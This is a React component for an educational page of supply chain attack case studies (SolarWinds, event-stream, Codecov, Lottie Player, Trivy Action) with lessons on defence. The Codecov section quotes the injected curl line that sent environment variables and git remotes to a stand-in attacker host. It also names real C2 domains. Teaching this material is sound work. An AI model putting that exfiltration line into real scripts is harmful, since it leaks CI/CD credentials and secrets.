import { useState } from 'react';
import { FiChevronDown } from 'react-icons/fi';

function YouTubeEmbed({ id, caption }) {
  return (
    <div className="video-embed" style={{ marginTop: '1rem' }}>
      <iframe
        src={`https://www.youtube.com/embed/${id}`}
        title={caption}
        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
        allowFullScreen
      />
      <div className="video-caption">
        <span className="yt-icon">&#9654;</span> {caption}
      </div>
    </div>
  );
}

function FlowDiagram({ steps }) {
  return (
    <div className="flow-diagram">
      {steps.map((s, i) => (
        <span key={i} style={{ display: 'contents' }}>
          <div className={`flow-box ${s.type || ''}`}>
            <h5>{s.label}</h5>
            <p>{s.desc}</p>
          </div>
          {i < steps.length - 1 && <span className={`flow-arrow ${s.arrowType || ''}`}>&rarr;</span>}
        </span>
      ))}
    </div>
  );
}

const cases = [
  {
    year: 'December 2020',
    title: 'SolarWinds / SUNBURST',
    type: 'Build Process Compromise // T1195.002',
    impact: [
      { value: '18,000+', label: 'Orgs Affected' },
      { value: '~100', label: 'Actively Exploited' },
      { value: '9 mo', label: 'Undetected' },
      { value: '$B+', label: 'Cleanup Cost' },
    ],
    details: (
      <>
        <h4>The Story</h4>
        <p>
          This is the attack that put "supply chain" on every CISO's radar. Russian intelligence (APT29 / Cozy Bear),
          linked to the SVR, spent months inside SolarWinds' network before touching the build system. Their
          target: <strong>Orion</strong>, a network monitoring platform used by <strong>300,000 customers</strong>
          including most Fortune 500 companies and US government agencies.
        </p>
        <p>
          The attackers didn't modify source code in the repository &mdash; that would be caught by code review.
          Instead, they planted <strong>SUNSPOT</strong>, a tool that watched the build server for
          <code> MsBuild.exe</code> processes. When Orion was being compiled, SUNSPOT <strong>swapped a single
          source file</strong> with a backdoored version, waited for compilation to finish, then <strong>restored
          the original</strong>. The result: a trojanized DLL <em>legitimately signed</em> by SolarWinds' own
          certificate. No developer ever saw malicious code in the repo.
        </p>
        <h4>What Made SUNBURST So Sophisticated</h4>
        <ul>
          <li><strong>12-14 day dormancy:</strong> After installation, the backdoor slept for two weeks before activating, ensuring it survived any post-deployment testing period</li>
          <li><strong>Domain Generation Algorithm (DGA):</strong> C2 communication used algorithmically generated subdomains of <code>avsvmcloud.com</code>, making DNS traffic look like normal SolarWinds API calls</li>
          <li><strong>Anti-forensics:</strong> Checked for security tools (Wireshark, Fiddler, sandboxes) and disabled itself if detected</li>
          <li><strong>Selective targeting:</strong> Of 18,000 infected organizations, only ~100 received second-stage payloads. The rest were left dormant to minimize detection risk</li>
          <li><strong>Victims included:</strong> US Treasury, Department of Homeland Security, State Department, Microsoft, FireEye, Intel, Cisco, Deloitte</li>
        </ul>
        <h4>How It Was Discovered</h4>
        <p>
          <strong>Irony:</strong> FireEye (now Mandiant), a cybersecurity company, discovered they'd been breached
          when someone used stolen credentials to register a new device for MFA on an employee's account.
          Investigating <em>their own breach</em>, they traced the intrusion back to the Orion update.
          If FireEye hadn't been a customer, this could have gone undetected for years.
        </p>

        <h4>Attack Flow</h4>
        <div className="illustration" style={{ margin: '0.75rem 0' }}>
          <div className="illustration-content">
            <FlowDiagram steps={[
              { label: 'APT29', desc: 'Infiltrates build server', type: 'attacker', arrowType: 'danger' },
              { label: 'SUNSPOT', desc: 'Swaps source at compile', type: 'compromised', arrowType: 'danger' },
              { label: 'Signed Update', desc: 'Orion v2020.2.1', type: 'compromised', arrowType: 'danger' },
              { label: '18,000 Orgs', desc: 'Install trojanized update', type: 'victim' },
            ]} />
          </div>
        </div>
      </>
    ),
    lesson: 'Source code review is not enough — the malicious code only existed during compilation. A legitimate digital signature doesn\'t mean the code is safe. Even FireEye, a security company, was a victim.',
  },
  {
    year: 'November 2018',
    title: 'event-stream / flatmap-stream',
    type: 'Compromised Package (Maintainer Takeover) // T1195.001',
    impact: [
      { value: '2M+', label: 'Weekly Downloads' },
      { value: '~2 mo', label: 'Undetected' },
      { value: 'BTC', label: 'Crypto Targeted' },
    ],
    details: (
      <>
        <h4>The Story</h4>
        <p>
          This case is a masterclass in social engineering the open-source ecosystem. <code>event-stream</code>
          was a popular npm package with <strong>2 million weekly downloads</strong>. Its creator, Dominic Tarr,
          was a prolific open-source contributor who had moved on to other projects. He no longer used
          event-stream himself. Maintaining it was unpaid work he didn't want to do.
        </p>
        <p>
          A GitHub user named <strong>"right9ctrl"</strong> sent Tarr an email offering to take over maintenance.
          Tarr agreed &mdash; grateful someone cared. right9ctrl made a few legitimate-looking commits to build trust,
          then <strong>added a new dependency</strong> called <code>flatmap-stream</code>. This package contained
          the actual payload, but it was <strong>AES-256 encrypted</strong> and hidden inside a minified test
          fixture file &mdash; impossible to read through static analysis.
        </p>
        <h4>The Elegant Targeting</h4>
        <ul>
          <li><strong>Encrypted payload:</strong> The malicious code was AES-encrypted. Static analysis tools couldn't read it. <code>npm audit</code> saw nothing wrong.</li>
          <li><strong>The decryption key</strong> was derived from the <code>description</code> field in the <strong>Copay Bitcoin wallet's</strong> <code>package.json</code>. This meant the code <em>only decrypted and executed inside Copay</em>.</li>
          <li><strong>Everywhere else</strong> the encrypted payload remained dormant, inert data. Your tests passed. Your app worked. No errors, no warnings.</li>
          <li><strong>When active in Copay:</strong> The code intercepted the <code>bitcore-wallet-client</code> library's <code>getKeys()</code> method, stealing Bitcoin private keys during transaction signing</li>
          <li><strong>Hidden in a transitive dependency:</strong> Developers who depended on event-stream never knew flatmap-stream existed. Trust was <em>transitive</em>.</li>
        </ul>
        <h4>Discovery</h4>
        <p>
          Developer <strong>Ayrton Sparling</strong> (GitHub: FallingSnow) noticed a deprecation warning from
          a new dependency while reviewing his project's updates. Curious, he dug into flatmap-stream's source,
          found the encrypted blob, and raised <strong>GitHub issue #116</strong> on event-stream. The open-source
          community quickly deobfuscated the payload and confirmed the targeted Copay attack.
        </p>

        <h4>Attack Flow</h4>
        <div className="illustration" style={{ margin: '0.75rem 0' }}>
          <div className="illustration-content">
            <FlowDiagram steps={[
              { label: 'right9ctrl', desc: 'Social engineers maintainer', type: 'attacker', arrowType: 'danger' },
              { label: 'event-stream', desc: 'Adds flatmap-stream dep', type: 'compromised', arrowType: 'danger' },
              { label: 'Copay Wallet', desc: 'AES payload activates', type: 'victim', arrowType: 'danger' },
              { label: 'BTC Stolen', desc: 'Private keys exfiltrated', type: 'attacker' },
            ]} />
          </div>
        </div>

        <YouTubeEmbed id="cvumD7bhLWU" caption="event-stream: Analysis of a compromised npm package" />
      </>
    ),
    lesson: 'Maintainer burnout is a systemic security risk. Trust is transitive — trusting event-stream meant implicitly trusting every dependency it adds. One curious developer\'s vigilance saved the ecosystem.',
  },
  {
    year: 'January – April 2021',
    title: 'Codecov Bash Uploader',
    type: 'CI/CD Pipeline Compromise // T1195.002',
    impact: [
      { value: '3 mo', label: 'Duration' },
      { value: '29,000', label: 'Customers' },
      { value: 'Keys', label: 'Secrets Leaked' },
    ],
    details: (
      <>
        <h4>The Story</h4>
        <p>
          Codecov is a code coverage reporting tool used by <strong>29,000 organizations</strong> including
          Atlassian, GoDaddy, Procter & Gamble, and the Washington Post. Their integration works via a
          Bash script that developers pipe into their CI/CD pipelines: <code>curl -s https://codecov.io/bash | bash</code>.
          If that script is compromised, every pipeline running it is compromised.
        </p>
        <p>
          In January 2021, attackers discovered a flaw in Codecov's Docker image creation process that allowed
          them to extract the credential used to update the Bash Uploader script. They added <strong>a single
          line of code</strong> to the script &mdash; one <code>curl</code> command that exfiltrated every
          environment variable from every CI/CD pipeline that ran it.
        </p>
        <h4>The Injected Line (One Line, Thousands of Victims)</h4>
        <ul>
          <li><code>curl -sm 0.5 -d "$(git remote -v){'<<<'}{'<<<'} ENV $(env)" http://attacker-ip/upload || true</code></li>
          <li>This single line collected: git remote URLs (revealing internal repo names), and <strong>every environment variable</strong> &mdash; <code>AWS_SECRET_ACCESS_KEY</code>, <code>NPM_TOKEN</code>, <code>GITHUB_TOKEN</code>, <code>DATABASE_URL</code>, everything</li>
          <li>The <code>-sm 0.5</code> flag made it silent with a 0.5s timeout (so CI didn't slow down noticeably)</li>
          <li>The <code>|| true</code> ensured if the exfiltration failed, the pipeline continued normally &mdash; no errors, no alerts</li>
          <li>This ran undetected for <strong>3 months</strong> across thousands of organizations' CI/CD pipelines</li>
        </ul>
        <h4>Discovery & Aftermath</h4>
        <p>
          A security-conscious customer downloaded the Bash Uploader and computed its SHA-256 hash.
          It didn't match the hash listed on Codecov's GitHub repository. That simple check &mdash; comparing
          a hash &mdash; is what caught a 3-month-long breach. Twitch was among the affected companies;
          their source code was later leaked, partly traced back to credentials stolen through Codecov.
        </p>

        <h4>Attack Flow</h4>
        <div className="illustration" style={{ margin: '0.75rem 0' }}>
          <div className="illustration-content">
            <FlowDiagram steps={[
              { label: 'Attacker', desc: 'Exploits Docker flaw', type: 'attacker', arrowType: 'danger' },
              { label: 'Bash Uploader', desc: '+1 line of curl exfil', type: 'compromised', arrowType: 'danger' },
              { label: 'CI/CD Pipelines', desc: 'curl codecov.io/bash', type: 'victim', arrowType: 'danger' },
              { label: 'Secrets Leaked', desc: 'AWS, npm, DB tokens', type: 'attacker' },
            ]} />
          </div>
        </div>
      </>
    ),
    lesson: 'The "curl | bash" pattern is fundamentally dangerous — you\'re executing whatever the server sends. Always verify script integrity. Minimize secrets in CI/CD. One hash check caught a 3-month breach.',
  },
  {
    year: 'October 2024',
    title: 'Lottie Player (TryHackMe Lab)',
    type: 'Compromised Package (Token Theft) // T1195.001',
    impact: [
      { value: '1000s', label: 'Sites Affected' },
      { value: 'Crypto', label: 'Wallets Drained' },
      { value: 'Hours', label: 'To Detection' },
    ],
    details: (
      <>
        <h4>The Story</h4>
        <p>
          <strong>Lottie Player</strong> by LottieFiles is a widely-used web component for rendering Lottie
          animations. Thousands of websites embed it directly from npm/CDN for animated graphics, loading
          spinners, and interactive illustrations. In October 2024, an attacker <strong>stole an npm
          maintainer's authentication token</strong> and used it to publish three malicious versions:
          <code> 2.0.5</code>, <code>2.0.6</code>, and <code>2.0.7</code>.
        </p>
        <h4>What the Malicious Code Did</h4>
        <ul>
          <li>Injected a full-screen <strong>"Connect Wallet" popup overlay</strong> on every website loading the library</li>
          <li>Supported MetaMask, Coinbase Wallet, WalletConnect, and other popular crypto wallet providers</li>
          <li>When a user connected their wallet (thinking it was part of the website), <strong>all tokens, NFTs, and cryptocurrency were drained</strong> to the attacker's wallet</li>
          <li>C2 server at <code>castleservices01[.]com</code> coordinated the drain operations</li>
          <li>Any website loading via CDN with <code>@latest</code> was <strong>automatically</strong> affected &mdash; no action needed from the site owner</li>
          <li>At least one victim reported losing <strong>$723,000 in Bitcoin</strong> from a single wallet connection</li>
        </ul>
        <h4>Why <code>@latest</code> is Dangerous</h4>
        <p>
          Sites that loaded <code>{'<'}script src="https://cdn.jsdelivr.net/npm/@lottiefiles/lottie-player@latest"{'>'}</code>
          were instantly compromised when v2.0.5 was published. The CDN served the newest version automatically.
          Sites that pinned to <code>@2.0.4</code> (the last clean version) were <strong>completely unaffected</strong>.
          This is the difference between <code>@latest</code> and a pinned version.
        </p>
        <h4>Hands-On Lab</h4>
        <p>
          This exact case is the basis for the <strong>TryHackMe "Supply Chain Attack: Lottie" room</strong> that
          we'll work through in our labs section. You'll analyze the malicious code, trace the wallet drainer,
          and understand the attack timeline.
        </p>
      </>
    ),
    lesson: 'Never use @latest for CDN scripts — pin exact versions. Use Subresource Integrity (SRI) hashes to verify script content. Protect npm tokens with MFA and IP allowlists. One stolen token = every website using your library is compromised.',
  },
  {
    year: 'March 2026',
    title: 'TeamPCP / Trivy Action',
    type: 'CI/CD + Cascading Supply Chain // T1195.001 + T1195.002',
    impact: [
      { value: '75/76', label: 'Tags Poisoned' },
      { value: '10K+', label: 'Workflows Hit' },
      { value: '∞', label: 'Blockchain C2' },
    ],
    details: (
      <>
        <h4>The Story</h4>
        <p>
          This is the most <strong>recent and most alarming</strong> supply chain attack. It started with
          <code> tj-actions/changed-files</code> in early 2025 (23,000+ repos affected) and <strong>cascaded</strong>
          into something far worse. Using tokens stolen in the tj-actions breach, attackers went after a
          bigger target: <strong>aquasecurity/trivy-action</strong>, one of the most popular security scanning
          tools in the GitHub Actions ecosystem.
        </p>
        <p>
          The irony is staggering: <strong>Trivy is a vulnerability scanner</strong>. Organizations use it to
          <em>detect</em> security issues in their code. The attackers weaponized the very tool companies trusted
          to keep them safe. They modified <strong>75 of 76 version tags</strong> to point to malicious code that
          exfiltrated CI/CD secrets from every workflow that ran it.
        </p>
        <h4>The Cascading Attack Chain</h4>
        <ul>
          <li><strong>Step 1:</strong> Compromise tj-actions via a stolen maintainer PAT (Personal Access Token). 23,000+ repos leak their CI/CD secrets.</li>
          <li><strong>Step 2:</strong> Among the stolen credentials: tokens with write access to aquasecurity/trivy-action</li>
          <li><strong>Step 3:</strong> Rewrite 75 of 76 version tags in trivy-action to point to malicious code. 10,000+ workflows now execute attacker code.</li>
          <li><strong>Step 4:</strong> Harvest npm/PyPI tokens from trivy-action victims and publish <strong>CanisterWorm</strong> malware to package registries</li>
        </ul>
        <h4>CanisterWorm: The Next-Gen C2</h4>
        <p>
          Traditional malware uses domain-based C2: authorities seize the domain, game over. CanisterWorm
          stores its command-and-control instructions <strong>on a blockchain</strong>. Commands are recorded
          on-chain, immutable, and decentralized. You cannot take down a blockchain. You cannot seize a smart
          contract. You cannot censor on-chain data. This is the <strong>first widely documented supply chain
          attack using blockchain C2</strong>, and it represents a fundamental shift in how attackers maintain persistence.
        </p>
      </>
    ),
    lesson: 'Pin GitHub Actions to commit SHAs, never tags. Even security tools can be weaponized. Supply chain attacks cascade — one breach enables the next. Blockchain C2 represents a new era of unkillable command infrastructure.',
  },
];

function CaseCard({ c }) {
  const [open, setOpen] = useState(false);
  return (
    <div className="timeline-item">
      <div className="timeline-dot" />
      <div className="timeline-year">{c.year}</div>
      <div className="case-card">
        <div className="case-card-header" onClick={() => setOpen(!open)}>
          <div>
            <h3>{c.title}</h3>
            <div className="case-type">{c.type}</div>
          </div>
          <button className={`case-card-toggle${open ? ' open' : ''}`}><FiChevronDown /></button>
        </div>
        {open && (
          <div className="case-card-body">
            <div className="impact-grid">
              {c.impact.map((m, i) => (
                <div className="impact-item" key={i}>
                  <span className="impact-value">{m.value}</span>
                  <span className="impact-label">{m.label}</span>
                </div>
              ))}
            </div>
            {c.details}
            <div className="case-lesson">
              <strong>Key Lesson</strong>
              <p>{c.lesson}</p>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

export default function CaseStudies() {
  return (
    <div className="page">
      <div className="page-header">
        <div className="page-tag">Part 2</div>
        <h1>Real-World Case Studies</h1>
        <p>Deep dives into landmark supply chain attacks from 2018 to 2026, with technical details, impact analysis, and key lessons.</p>
      </div>
      <div className="timeline">
        {cases.map((c, i) => <CaseCard key={i} c={c} />)}
      </div>

      <div className="media-section">
        <h2>Video Explainers</h2>
        <div className="video-grid">
          <YouTubeEmbed
            id="qmXcMACowR4"
            caption='The "Largest Supply Chain Attack Ever" — npm compromise (2025)'
          />
          <YouTubeEmbed
            id="QVqIx-Y8s-s"
            caption="The largest supply-chain attack ever — Fireship breakdown"
          />
        </div>
      </div>
    </div>
  );
}
